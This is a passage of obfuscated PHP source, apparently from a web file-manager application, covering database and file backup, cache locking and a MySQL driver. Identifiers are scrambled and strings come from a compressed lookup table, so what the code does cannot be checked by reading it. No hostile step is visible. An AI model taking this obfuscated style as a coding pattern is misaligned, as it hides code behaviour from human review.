. json_encode(array($Å¹Í¸Õğ, $Í¸ÈÂÂó))); } public function nameParse($œıåÕğ) { $ÇÇâ¤ë  =& $_SERVER[ÔÕ±ĞšÎ]; $ƒÜğŞŠò =& $this->task; if ($ƒÜğŞŠò[$ÇÇâ¤ë [1897]] == $ÇÇâ¤ë [1281]) { $ƒÜğŞŠò[$ÇÇâ¤ë [1897]] = $ÇÇâ¤ë [390]; $ƒÜğŞŠò[$ÇÇâ¤ë [1836]] = 0; $ƒÜğŞŠò[$ÇÇâ¤ë [837]] = 0; } $Í²Üğ« = get_path_this($œıåÕğ); if (strstr($Í²Üğ«, $ÇÇâ¤ë [10])) { $ƒÜğŞŠò[$ÇÇâ¤ë [1778]] += 1; $ƒÜğŞŠò[$ÇÇâ¤ë [1142]] += 1; } $ƒÜğŞŠò[$ÇÇâ¤ë [1829]] = $œıåÕğ; $this->update(); } } goto f†˜Üë‹Ñ¶; AãØòÌ¦ñ—: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $£©“ŞĞ² =& $_SERVER[ÔÕ±ĞšÎ]; $æ‰ò”İ = Backup::get(); self::$io = $æ‰ò”İ[$£©“ŞĞ²[826]]; self::$name = $æ‰ò”İ[$£©“ŞĞ²[32]]; $ãâ¢‚Ü = new DbManage(); $‰Øç”é = $ãâ¢‚Ü->dbType(); $î¾Ì¨²µ = array($£©“ŞĞ²[851] => $‰Øç”é, $£©“ŞĞ²[852] => time()); Backup::set($î¾Ì¨²µ); $ŒÑ¨¬ = $this->tmpFilesPath() . $£©“ŞĞ²[853] . self::$name . $£©“ŞĞ²[8]; del_dir($ŒÑ¨¬); mk_dir($ŒÑ¨¬); $¹ã³Æç = $Ÿæ¤ ½Æ = 0; try { $äşú±Úø = $ãâ¢‚Ü->db()->getTables(); } catch (Exception $ˆÖÂ›) { return !1; } $äşú±Úø = array_diff($äşú±Úø, array($£©“ŞĞ²[854], $£©“ŞĞ²[855])); foreach ($äşú±Úø as $º£è³Ğ„) { if ($º£è³Ğ„ == $£©“ŞĞ²[856]) { continue; } $¹ã³Æç += $ãâ¢‚Ü->model($º£è³Ğ„)->count(); } $ÌüöóöÅ = new Task($£©“ŞĞ²[857], $£©“ŞĞ²[858], $¹ã³Æç, LNG($£©“ŞĞ²[859]) . $£©“ŞĞ²[860] . LNG($£©“ŞĞ²[861])); $GLOBALS[$£©“ŞĞ²[862]] = self::$name; foreach ($äşú±Úø as $º£è³Ğ„) { $æ‰êÊÛÅ = $ŒÑ¨¬ . $º£è³Ğ„ . $£©“ŞĞ²[863]; if ($º£è³Ğ„ == $£©“ŞĞ²[856]) { @touch($æ‰êÊÛÅ); continue; } $÷‰™ı˜¬ = null; if ($º£è³Ğ„ == $£©“ŞĞ²[864] && $æ‰ò”İ[$£©“ŞĞ²[171]] == $£©“ŞĞ²[850]) { $÷‰™ı˜¬ = self::$io; } $Ÿæ¤ ½Æ += $ãâ¢‚Ü->sqlFromDb($º£è³Ğ„, $æ‰êÊÛÅ, $ÌüöóöÅ, $÷‰™ı˜¬); } unset($GLOBALS[$£©“ŞĞ²[862]]); $ÌüöóöÅ->end(); if ($Ÿæ¤ ½Æ > $¹ã³Æç) { $¹ã³Æç = $Ÿæ¤ ½Æ; } $î¾Ì¨²µ = array($£©“ŞĞ²[851] => $‰Øç”é, $£©“ŞĞ²[847] => 1, $£©“ŞĞ²[865] => $¹ã³Æç, $£©“ŞĞ²[866] => $Ÿæ¤ ½Æ, $£©“ŞĞ²[867] => time()); Backup::set($î¾Ì¨²µ); if ($¹ã³Æç - $Ÿæ¤ ½Æ > 0) { $Â—ğù‹ = $£©“ŞĞ²[868]; if (!stristr(I18n::getType(), $£©“ŞĞ²[869])) { $Â—ğù‹ = $£©“ŞĞ²[870]; } write_log(array($Â—ğù‹, $î¾Ì¨²µ), $£©“ŞĞ²[858]); return !1; } return !0; } private function tmpFilesPath() { $Õ÷ÂİË… =& $_SERVER[ÔÕ±ĞšÎ]; $®ºµ±„Ú = TEMP_FILES; if ($GLOBALS[$Õ÷ÂİË…[6]][$Õ÷ÂİË…[92]][$Õ÷ÂİË…[871]]) { $®ºµ±„Ú = $GLOBALS[$Õ÷ÂİË…[6]][$Õ÷ÂİË…[92]][$Õ÷ÂİË…[871]]; if (!mk_dir($®ºµ±„Ú) || !is_writable($®ºµ±„Ú) || !IO::mkfile($®ºµ±„Ú . $Õ÷ÂİË…[872])) { $®ºµ±„Ú = TEMP_FILES; } } return $®ºµ±„Ú; } } class BackupDbFile { public function __construct() { } public function index() { $µğÕ—†³ =& $_SERVER[ÔÕ±ĞšÎ]; $Ë¦Õ–ÅÀ = Backup::get(); $†ú íõ = $Ë¦Õ–ÅÀ[$µğÕ—†³[32]]; $¬ÁÃÓÌç = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\x70\137{$†ú íõ}\x2f"; $¢Ñ­ÛµÔ = $this->backupPath($Ë¦Õ–ÅÀ); if (!($¢Ñ­ÛµÔ = IO::mkdir($¢Ñ­ÛµÔ))) { return !1; } $Ó¬åé¢± = IO::listPath($¬ÁÃÓÌç); $±­•ùØ = isset($Ó¬åé¢±[$µğÕ—†³[86]]) ? $Ó¬åé¢±[$µğÕ—†³[86]] : array(); $‡¤ˆøóš = array_sum(array_column($±­•ùØ, $µğÕ—†³[79])); if (!$‡¤ˆøóš) { return !1; } $¡è = array($µğÕ—†³[873] => $‡¤ˆøóš, $µğÕ—†³[874] => time()); Backup::set($¡è); $ØöüîĞ = new TaskFileTransfer($µğÕ—†³[875], $µğÕ—†³[858], count($±­•ùØ), LNG($µğÕ—†³[859]) . $µğÕ—†³[464] . LNG($µğÕ—†³[861]) . $µğÕ—†³[876]); $ØöüîĞ->task[$µğÕ—†³[837]] = $‡¤ˆøóš; foreach ($Ó¬åé¢±[$µğÕ—†³[86]] as $á›š»«) { $„ë–ËÜ = IO::move($á›š»«[$µğÕ—†³[87]], $¢Ñ­ÛµÔ); if (!$„ë–ËÜ) { $ØöüîĞ->end(); $¥¹í¦àÔ = IO::getLastError($µğÕ—†³[877] . $á›š»«[$µğÕ—†³[87]] . $µğÕ—†³[878] . $¢Ñ­ÛµÔ . $µğÕ—†³[178]); write_log($¥¹í¦àÔ, $µğÕ—†³[858]); return !1; } } $À«Â±™ = new DbManage(); $ÁÖÎ‹‡ = $À«Â±™->getSqlFile(); if (!$ÁÖÎ‹‡[$µğÕ—†³[879]] || !$ÁÖÎ‹‡[$µğÕ—†³[13]]) { return !1; } IO::move($ÁÖÎ‹‡[$µğÕ—†³[879]], $¢Ñ­ÛµÔ); IO::move($ÁÖÎ‹‡[$µğÕ—†³[13]], $¢Ñ­ÛµÔ); $ØöüîĞ->end(); $¡è = array($µğÕ—†³[880] => $‡¤ˆøóš, $µğÕ—†³[881] => time()); Backup::set($¡è); return !0; } private function backupPath($•îòÅºı) { $æğ—ŒÊƒ =& $_SERVER[ÔÕ±ĞšÎ]; $¶î¡¼Î« = $•îòÅºı[$æğ—ŒÊƒ[32]]; $Ü÷ß®ÂÍ = Model($æğ—ŒÊƒ[844])->get($æğ—ŒÊƒ[845]); $‡ãÓãñØ = substr(md5($æğ—ŒÊƒ[846] . $Ü÷ß®ÂÍ . $¶î¡¼Î«), 0, 8); return "\x7b\151\x6f\72{$•îòÅºı[$æğ—ŒÊƒ[826]]}\x7d\57\144\x61\x74\x61\x62\x61\x73\x65\57\142\x61\x63\153\165\x70\57" . $¶î¡¼Î« . $æğ—ŒÊƒ[11] . $‡ãÓãñØ; } private function tmpFilesPath() { $ÈÁ¦‡ì› =& $_SERVER[ÔÕ±ĞšÎ]; $µÉÖúåñ = TEMP_FILES; if ($GLOBALS[$ÈÁ¦‡ì›[6]][$ÈÁ¦‡ì›[92]][$ÈÁ¦‡ì›[871]]) { $µÉÖúåñ = $GLOBALS[$ÈÁ¦‡ì›[6]][$ÈÁ¦‡ì›[92]][$ÈÁ¦‡ì›[871]]; if (!mk_dir($µÉÖúåñ) || !is_writable($µÉÖúåñ) || !IO::mkfile($µÉÖúåñ . $ÈÁ¦‡ì›[872])) { $µÉÖúåñ = TEMP_FILES; } } return $µÉÖúåñ; } } class BackupFile { public function __construct() { } public function index() { $²É˜­Ú = Backup::get(); $²²Œíšì = $²É˜­Ú[$_SERVER[ÔÕ±ĞšÎ][370]][$_SERVER[ÔÕ±ĞšÎ][232]][$_SERVER[ÔÕ±ĞšÎ][543]]; $÷²íçÊç = array($_SERVER[ÔÕ±ĞšÎ][544] => array($_SERVER[ÔÕ±ĞšÎ][882], $²²Œíšì), $_SERVER[ÔÕ±ĞšÎ][883] => array($_SERVER[ÔÕ±ĞšÎ][408], $²É˜­Ú[$_SERVER[ÔÕ±ĞšÎ][826]])); $ªíËãÎ = (int) Model($_SERVER[ÔÕ±ĞšÎ][864])->where($÷²íçÊç)->count($_SERVER[ÔÕ±ĞšÎ][543]); $’Õ’ıš• = (int) Model($_SERVER[ÔÕ±ĞšÎ][864])->where($÷²íçÊç)->sum($_SERVER[ÔÕ±ĞšÎ][79]); $µ‰Óì® = new TaskFileTransfer($_SERVER[ÔÕ±ĞšÎ][884], $_SERVER[ÔÕ±ĞšÎ][858], $ªíËãÎ, LNG($_SERVER[ÔÕ±ĞšÎ][859]) . $_SERVER[ÔÕ±ĞšÎ][860] . LNG($_SERVER[ÔÕ±ĞšÎ][885])); $µ‰Óì®->task[$_SERVER[ÔÕ±ĞšÎ][837]] = $’Õ’ıš•; $ğÕ˜Úœ™ = array($_SERVER[ÔÕ±ĞšÎ][886] => $ªíËãÎ, $_SERVER[ÔÕ±ĞšÎ][887] => $’Õ’ıš•, $_SERVER[ÔÕ±ĞšÎ][888] => time()); Backup::set($ğÕ˜Úœ™); $»¿ãÚÆ = !0; $ÖÛ‡²ğ = $this->storeIds(); $ÃÉ„‡„˜ = 1; $é«®±¦ = 1000; $›±Î«Ÿ² = $¥Ò“›ã¾ = 0; $ç¨½ŸãÀ = array(); $³ãâñ—Ø = $”ƒò—ñ¨ = 0; do { $ ı³¤„ã = $_SERVER[ÔÕ±ĞšÎ][889]; $ó°œÏúü = Model($_SERVER[ÔÕ±ĞšÎ][864])->where($÷²íçÊç)->field($ ı³¤„ã)->order($_SERVER[ÔÕ±ĞšÎ][890])->selectPage($é«®±¦, $ÃÉ„‡„˜); $ƒÊÊÔü© = !empty($ó°œÏúü[$_SERVER[ÔÕ±ĞšÎ][447]]) ? $ó°œÏúü[$_SERVER[ÔÕ±ĞšÎ][447]] : array(); foreach ($ƒÊÊÔü© as $¯Á»Œ†ì) { if (!$this->_fileExist($¯Á»Œ†ì, $ç¨½ŸãÀ, $ÖÛ‡²ğ)) { write_log("\146\x69\x6c\145\40\156\x6f\x74\x20\x65\170\x69\163\164\x2e\x66\151\x6c\145\111\104\72{$¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][543]]}\54\40\x70\141\x74\150\72{$¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][87]]}", $_SERVER[ÔÕ±ĞšÎ][891]); continue; } $Ù„”¡Æ = $¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][87]]; $â“ÏêƒØ = "\173\x69\157\x3a{$²É˜­Ú[$_SERVER[ÔÕ±ĞšÎ][826]]}\x7d" . substr($Ù„”¡Æ, strlen("\x7b\151\x6f\x3a{$¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][892]]}\x7d")); if (IO::exist($â“ÏêƒØ)) { $µ‰Óì®->updateFileEnd($¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][32]], $¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][79]]); } else { $â“ÏêƒØ = get_path_father($â“ÏêƒØ); IO::mkdir($â“ÏêƒØ); if (!IO::copy($Ù„”¡Æ, $â“ÏêƒØ, $_SERVER[ÔÕ±ĞšÎ][893])) { write_log($_SERVER[ÔÕ±ĞšÎ][894] . $Ù„”¡Æ . $_SERVER[ÔÕ±ĞšÎ][878] . $â“ÏêƒØ . $_SERVER[ÔÕ±ĞšÎ][178], $_SERVER[ÔÕ±ĞšÎ][858]); $»¿ãÚÆ = !1; break; } } $²²Œíšì = $¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][543]]; $¥Ò“›ã¾ += 1; $›±Î«Ÿ² += $¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][79]]; $”ƒò—ñ¨ += 1; $³ãâñ—Ø += $¯Á»Œ†ì[$_SERVER[ÔÕ±ĞšÎ][79]]; if ($›±Î«Ÿ² >= 1024 * 1024 * 100) { $ğÕ˜Úœ™ = array($_SERVER[ÔÕ±ĞšÎ][825] => $²²Œíšì, $_SERVER[ÔÕ±ĞšÎ][895] => $”ƒò—ñ¨, $_SERVER[ÔÕ±ĞšÎ][896] => $³ãâñ—Ø); Backup::set($ğÕ˜Úœ™); $›±Î«Ÿ² = $¥Ò“›ã¾ = 0; } } $–ïÄç—ß = count($ƒÊÊÔü©); $ÃÉ„‡„˜++; } while ($–ïÄç—ß == $é«®±¦); $µ‰Óì®->end(); $ğÕ˜Úœ™ = array($_SERVER[ÔÕ±ĞšÎ][897] => 1, $_SERVER[ÔÕ±ĞšÎ][835] => time(), $_SERVER[ÔÕ±ĞšÎ][849] => 1, $_SERVER[ÔÕ±ĞšÎ][825] => $²²Œíšì, $_SERVER[ÔÕ±ĞšÎ][898] => time()); if ($¥Ò“›ã¾) { $ğÕ˜Úœ™[$_SERVER[ÔÕ±ĞšÎ][895]] = $”ƒò—ñ¨; $ğÕ˜Úœ™[$_SERVER[ÔÕ±ĞšÎ][896]] = $³ãâñ—Ø; } Backup::set($ğÕ˜Úœ™); return !0; } private function _fileExist($”ØÉŞ, &$•”ı°ÑÛ, $øéª”åß) { $Õãºèô =& $_SERVER[ÔÕ±ĞšÎ]; $úç‰ùÉ¥ = $”ØÉŞ[$Õãºèô[87]]; if (in_array($”ØÉŞ[$Õãºèô[543]], $•”ı°ÑÛ)) { return !1; } if (!in_array($”ØÉŞ[$Õãºèô[892]], $øéª”åß)) { return !1; } if (IO::exist($úç‰ùÉ¥)) { return !0; } $ñœïàöğ = get_path_father($úç‰ùÉ¥); if (IO::exist($ñœïàöğ)) { $•”ı°ÑÛ[] = $”ØÉŞ[$Õãºèô[543]]; return !1; } $¸›İŒòÌ = array($Õãºèô[892] => $”ØÉŞ[$Õãºèô[892]], $Õãºèô[87] => array($Õãºèô[461], "{$ñœïàöğ}\45")); $”ö¦İØ¹ = Model($Õãºèô[864])->where($¸›İŒòÌ)->field($Õãºèô[544])->select(); $•”ı°ÑÛ = array_merge($•”ı°ÑÛ, array_to_keyvalue($”ö¦İØ¹, $Õãºèô[12], $Õãºèô[543])); return !1; } private function _fileFilter($ÈÊÊŒĞ¤) { $¨ÎÎ¤ÜÊ =& $_SERVER[ÔÕ±ĞšÎ]; return; if (empty($ÈÊÊŒĞ¤)) { return; } $¯ıĞ†ª = array($¨ÎÎ¤ÜÊ[543] => array($¨ÎÎ¤ÜÊ[7], array_unique($ÈÊÊŒĞ¤))); $ç¯†£Òà = Model($¨ÎÎ¤ÜÊ[899])->where($¯ıĞ†ª)->field($¨ÎÎ¤ÜÊ[193])->select(); foreach ($ç¯†£Òà as $ìóØÚ÷) { Model($¨ÎÎ¤ÜÊ[899])->remove($ìóØÚ÷[$¨ÎÎ¤ÜÊ[193]], !1); } } private function storeIds() { $À¶óı§˜ =& $_SERVER[ÔÕ±ĞšÎ]; $—ãíèƒè = Model($À¶óı§˜[841])->listData(); $ş’ØçŒ¤ = array(); $Ÿ‡æ¡®À = $GLOBALS[$À¶óı§˜[6]][$À¶óı§˜[92]][$À¶óı§˜[900]]; foreach ($—ãíèƒè as $ÓœöÏ›) { $Ïı¾’Ñ™ = strtolower($ÓœöÏ›[$À¶óı§˜[98]]); if (!isset($Ÿ‡æ¡®À[$Ïı¾’Ñ™])) { continue; } $¦Ùí¥·ç = $À¶óı§˜[77] . (isset($Ÿ‡æ¡®À[$Ïı¾’Ñ™]) ? $Ÿ‡æ¡®À[$Ïı¾’Ñ™] : ucfirst($Ïı¾’Ñ™)); if (!class_exists($¦Ùí¥·ç)) { continue; } $ş’ØçŒ¤[] = $ÓœöÏ›[$À¶óı§˜[477]]; } return $ş’ØçŒ¤; } } goto dØÁ’©Ä; EåŠ¡Äö: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $İ˜³Óøä =& $_SERVER[ÔÕ±ĞšÎ]; $âÉ™ÆŠ  = $GLOBALS[$İ˜³Óøä[6]][$İ˜³Óøä[426]]; self::$cachePath = $âÉ™ÆŠ [$İ˜³Óøä[232]][$İ˜³Óøä[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($—ßõŸ©ù, $ıËá•œ = 0) { $š›šàÜ =& $_SERVER[ÔÕ±ĞšÎ]; $Úôé‡û¹ = microtime(!0); $¡Õ˜‹”í = $Úôé‡û¹ + $ıËá•œ + 0.0001; $§½“şä† = rtrim(self::$cachePath, $š›šàÜ[8]) . $š›šàÜ[939] . md5($—ßõŸ©ù) . $š›šàÜ[936]; if (file_exists($§½“şä†) && filemtime($§½“şä†) && filemtime($§½“şä†) < time() - 10) { @unlink($§½“şä†); } do { if (file_exists($§½“şä†)) { cacheLockWait(); continue; } $É¯Ïšœ˜ = fopen($§½“şä†, $š›šàÜ[940]); if (!$É¯Ïšœ˜) { return !1; } $ìşˆ¯» = flock($É¯Ïšœ˜, LOCK_EX | LOCK_NB); self::$caches[$—ßõŸ©ù] = array($š›šàÜ[941] => $É¯Ïšœ˜, $š›šàÜ[232] => $§½“şä†); fwrite($É¯Ïšœ˜, $¡Õ˜‹”í); clearstatcache(); if ($É¯Ïšœ˜ && $ìşˆ¯») { return !0; } cacheLockWait(); } while (microtime(!0) < $¡Õ˜‹”í); $this->unlock($—ßõŸ©ù); return !1; } public function lockGet($£Ø­Ãæ‹) { $«ûê­ˆ =& $_SERVER[ÔÕ±ĞšÎ]; $ˆÃÌÕàä = rtrim(self::$cachePath, $«ûê­ˆ[8]) . $«ûê­ˆ[939] . md5($£Ø­Ãæ‹) . $«ûê­ˆ[936]; return file_exists($ˆÃÌÕàä); } public function unlock($’…»Å™Œ) { $ò‘á×«® =& $_SERVER[ÔÕ±ĞšÎ]; $øİá¸ù = self::$caches[$’…»Å™Œ]; if (!$øİá¸ù) { return; } @flock($øİá¸ù[$ò‘á×«®[941]], LOCK_UN); @fclose($øİá¸ù[$ò‘á×«®[941]]); @unlink($øİá¸ù[$ò‘á×«®[232]]); unset(self::$caches[$’…»Å™Œ]); } } class CacheLockRedis { public function lock($Š»×›÷å, $í“ßó©à = 10) { $¢ÕÚèµõ = Cache::init(); $ÁĞÕßú = microtime(!0) + $í“ßó©à; while (microtime(!0) < $ÁĞÕßú) { $Óàç¥ºÊ = $¢ÕÚèµõ->get($Š»×›÷å); if (!$Óàç¥ºÊ) { $ñºëÀ’ª = $¢ÕÚèµõ->setLock($Š»×›÷å, $ÁĞÕßú, $í“ßó©à); if ($ñºëÀ’ª) { return !0; } } else { if ($Óàç¥ºÊ < microtime(!0)) { $¢ÕÚèµõ->set($Š»×›÷å, $ÁĞÕßú, $í“ßó©à * 2); if ($¢ÕÚèµõ->get($Š»×›÷å) === $Óàç¥ºÊ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Íò£²±İ) { return Cache::init()->get($Íò£²±İ); } public function unlock($Îæ×Ü­Ï) { return Cache::init()->remove($Îæ×Ü­Ï); } } goto bİ©»©§ˆ; bİ©»©§ˆ: class CacheLockMemcached { public function lock($ºÌ½Ü¤í, $ª ŸÓîƒ = 0) { $ëê…¹ˆÁ = Cache::init(); $úƒ ÊØ = microtime(!0) + $ª ŸÓîƒ; while (microtime(!0) < $úƒ ÊØ) { $£éüëà“ = $ëê…¹ˆÁ->get($ºÌ½Ü¤í); if (!$£éüëà“ || $£éüëà“ < microtime(!0)) { $’è½ß»Ë = $ëê…¹ˆÁ->handle->add($ºÌ½Ü¤í, $úƒ ÊØ, $ª ŸÓîƒ); if ($’è½ß»Ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ğğ¸Ğ¡) { return Cache::init()->get($Ğğ¸Ğ¡); } public function unlock($Ù±Ş¤×‘) { return Cache::init()->remove($Ù±Ş¤×‘); } } class CacheLockDatabase { public function lock($‡Şß©«„, $•…»¼ëõ = 0) { $é™›Ÿ = Model($_SERVER[ÔÕ±ĞšÎ][903]); $èä·¢  = microtime(!0) + $•…»¼ëõ; while (microtime(!0) < $èä·¢ ) { $‘æç§“ = $é™›Ÿ->get($‡Şß©«„); if (!$‘æç§“ || $‘æç§“ < microtime(!0)) { $œïÊ¥ñŠ = $é™›Ÿ->set($‡Şß©«„, $èä·¢ ); if ($œïÊ¥ñŠ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¯ãÈÄãë) { return Model($_SERVER[ÔÕ±ĞšÎ][903])->get($¯ãÈÄãë); } public function unlock($Íç­») { Model($_SERVER[ÔÕ±ĞšÎ][903])->remove($Íç­»); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¼ÛºÀŸØ, $ì…Ğ÷¡) { $ÆûËâºÇ =& $_SERVER[ÔÕ±ĞšÎ]; if (!class_exists($ÆûËâºÇ[942])) { show_json($ÆûËâºÇ[943], !1); } $this->cacheTime = $ì…Ğ÷¡; $this->handle = new Memcached(); if (is_array($¼ÛºÀŸØ[$ÆûËâºÇ[944]]) && count($¼ÛºÀŸØ[$ÆûËâºÇ[944]]) >= 1) { foreach ($¼ÛºÀŸØ[$ÆûËâºÇ[944]] as $‘Šàë‘©) { $Ó×˜‰½¡ = explode($ÆûËâºÇ[4], $‘Šàë‘©); $this->handle->addServer($Ó×˜‰½¡[0], $Ó×˜‰½¡[1]); } } else { $this->handle->addServer($¼ÛºÀŸØ[$ÆûËâºÇ[208]], $¼ÛºÀŸØ[$ÆûËâºÇ[209]]); } } public function set($¥Êšë, $ÕõóòÉÃ, $¸Ü¨ß” = false) { $¸Ü¨ß” = $¸Ü¨ß” ? $¸Ü¨ß” : $this->cacheTime; return $this->handle->set($¥Êšë, $ÕõóòÉÃ, $¸Ü¨ß”); } public function get($ÃàÄåéÀ) { return $this->handle->get($ÃàÄåéÀ); } public function remove($Ã‘ÄÃ¦) { return $this->handle->delete($Ã‘ÄÃ¦); } public function deleteAll() { return $this->handle->flush(); } } goto cçòã‰¯«Ş; bÉç¹öÃ§×: define($_SERVER[ÔÕ±ĞšÎ][0], $_SERVER[ÔÕ±ĞšÎ][1]); $_SERVER[óÃÄÎš—] = explode($_SERVER[ÔÕ±ĞšÎ][2], gzinflate(substr($_SERVER[ÔÕ±ĞšÎ][3], 10, -8))); function binCheckEq($õØÂÀ¼ú, $¿³œ¦’¶) { return $õØÂÀ¼ú == $¿³œ¦’¶; } goto eí›­ÓË±; CÖ°åé„¾º: class DbMysql extends Db { public function __construct($ó“ş‘ÍÊ = '') { $ŸœÚôÜ­ =& $_SERVER[ÔÕ±ĞšÎ]; if (!extension_loaded($ŸœÚôÜ­[879])) { think_exception(think_lang($ŸœÚôÜ­[14]) . $ŸœÚôÜ­[964]); } if (!empty($ó“ş‘ÍÊ)) { $this->config = $ó“ş‘ÍÊ; if (empty($this->config[$ŸœÚôÜ­[17]])) { $this->config[$ŸœÚôÜ­[17]] = $ŸœÚôÜ­[12]; } } } public function connect($¢ìŸàÁ = '', $Î×†İÔà = 0, $ı–¸ àÁ = false) { $Ó‡½í°ã =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($this->linkID[$Î×†İÔà])) { if (empty($¢ìŸàÁ)) { $¢ìŸàÁ = $this->config; } $»Îİ½±î = $¢ìŸàÁ[$Ó‡½í°ã[965]] . ($¢ìŸàÁ[$Ó‡½í°ã[966]] ? "\72{$¢ìŸàÁ[$Ó‡½í°ã[966]]}" : $Ó‡½í°ã[12]); $Ú×Éíğì = !empty($¢ìŸàÁ[$Ó‡½í°ã[17]][$Ó‡½í°ã[18]]) ? $¢ìŸàÁ[$Ó‡½í°ã[17]][$Ó‡½í°ã[18]] : $this->pconnect; if ($Ú×Éíğì) { $this->linkID[$Î×†İÔà] = mysql_pconnect($»Îİ½±î, $¢ìŸàÁ[$Ó‡½í°ã[967]], $¢ìŸàÁ[$Ó‡½í°ã[968]], 131072); } else { $this->linkID[$Î×†İÔà] = mysql_connect($»Îİ½±î, $¢ìŸàÁ[$Ó‡½í°ã[967]], $¢ìŸàÁ[$Ó‡½í°ã[968]], !0, 131072); } if (!$this->linkID[$Î×†İÔà] || !empty($¢ìŸàÁ[$Ó‡½í°ã[21]]) && !mysql_select_db($¢ìŸàÁ[$Ó‡½í°ã[21]], $this->linkID[$Î×†İÔà])) { think_exception(mysql_error()); } $êßÎå³ˆ = mysql_get_server_info($this->linkID[$Î×†İÔà]); mysql_query($Ó‡½í°ã[969] . think_config($Ó‡½í°ã[970]) . $Ó‡½í°ã[58], $this->linkID[$Î×†İÔà]); if ($êßÎå³ˆ > $Ó‡½í°ã[971]) { mysql_query($Ó‡½í°ã[972], $this->linkID[$Î×†İÔà]); } $this->connected = !0; if (1 != think_config($Ó‡½í°ã[22])) { unset($this->config); } } return $this->linkID[$Î×†İÔà]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ùîğâñë) { $İ™­¦µ =& $_SERVER[ÔÕ±ĞšÎ]; if (0 === stripos($Ùîğâñë, $İ™­¦µ[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ùîğâñë; if ($this->queryID) { $this->free(); } think_action_status($İ™­¦µ[23], 1); think_status($İ™­¦µ[24]); $this->queryID = mysql_query($Ùîğâñë, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($÷êô·š‰) { $¾Õµ¬ØÖ =& $_SERVER[ÔÕ±ĞšÎ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $÷êô·š‰; if ($this->queryID) { $this->free(); } think_action_status($¾Õµ¬ØÖ[25], 1); think_status($¾Õµ¬ØÖ[24]); $¼×ÇÆ‚‚ = mysql_query($÷êô·š‰, $this->_linkID); $this->debug(); if (!1 === $¼×ÇÆ‚‚) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÔÕ±ĞšÎ][973], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $œÂ¿ˆÀº = mysql_query($_SERVER[ÔÕ±ĞšÎ][974], $this->_linkID); $this->transTimes = 0; if (!$œÂ¿ˆÀº) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓÎóÓ¸Ú = mysql_query($_SERVER[ÔÕ±ĞšÎ][975], $this->_linkID); $this->transTimes = 0; if (!$ÓÎóÓ¸Ú) { $this->error(); return !1; } } return !0; } private function getAll() { $ñˆ˜ˆº = array(); if ($this->numRows > 0) { while ($Å÷ÒÈĞñ = mysql_fetch_assoc($this->queryID)) { $ñˆ˜ˆº[] = $Å÷ÒÈĞñ; } mysql_data_seek($this->queryID, 0); } return $ñˆ˜ˆº; } public function getFields($Ñ²Óßº) { $¥¯ÈËÈ =& $_SERVER[ÔÕ±ĞšÎ]; $áõ­Íí = $this->query($¥¯ÈËÈ[976] . $this->parseKey($Ñ²Óßº)); $Â¬ŸÎˆÎ = array(); if ($áõ­Íí) { foreach ($áõ­Íí as $ÕÔî±í» => $ÒäŒÈ¿È) { $Â¬ŸÎˆÎ[$ÒäŒÈ¿È[$¥¯ÈËÈ[31]]] = array($¥¯ÈËÈ[32] => $ÒäŒÈ¿È[$¥¯ÈËÈ[31]], $¥¯ÈËÈ[33] => $ÒäŒÈ¿È[$¥¯ÈËÈ[34]], $¥¯ÈËÈ[35] => (bool) (strtoupper($ÒäŒÈ¿È[$¥¯ÈËÈ[36]]) === $¥¯ÈËÈ[977]), $¥¯ÈËÈ[37] => $ÒäŒÈ¿È[$¥¯ÈËÈ[38]], $¥¯ÈËÈ[39] => strtolower($ÒäŒÈ¿È[$¥¯ÈËÈ[40]]) == $¥¯ÈËÈ[41], $¥¯ÈËÈ[42] => strtolower($ÒäŒÈ¿È[$¥¯ÈËÈ[43]]) == $¥¯ÈËÈ[44]); } } return $Â¬ŸÎˆÎ; } public function getTables($¸Ü–Ëû½ = '') { $Ù™è’Ö =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($¸Ü–Ëû½)) { $µŒÇÉü¤ = $Ù™è’Ö[978] . $¸Ü–Ëû½ . $Ù™è’Ö[979]; } else { $µŒÇÉü¤ = $Ù™è’Ö[980]; } $™ú©é°æ = $this->query($µŒÇÉü¤); $¡¾Œ¼Œî = array(); foreach ($™ú©é°æ as $Öƒ©¥–† => $º¤¸¾ş) { $¡¾Œ¼Œî[$Öƒ©¥–†] = current($º¤¸¾ş); } return $¡¾Œ¼Œî; } public function replace($÷ıÄö£î, $›Òï‹ö¼ = array()) { $Ñ±ÌËÄ =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($÷ıÄö£î as $ªíÃô‘Æ => $Âê‰è³…) { $«­äëÀ³ = $this->parseValue($Âê‰è³…); if (is_scalar($«­äëÀ³)) { $ÀÔ×ôˆÒ[] = $«­äëÀ³; $›ËõõÈü[] = $this->parseKey($ªíÃô‘Æ); } } $è»¼³¨¯ = 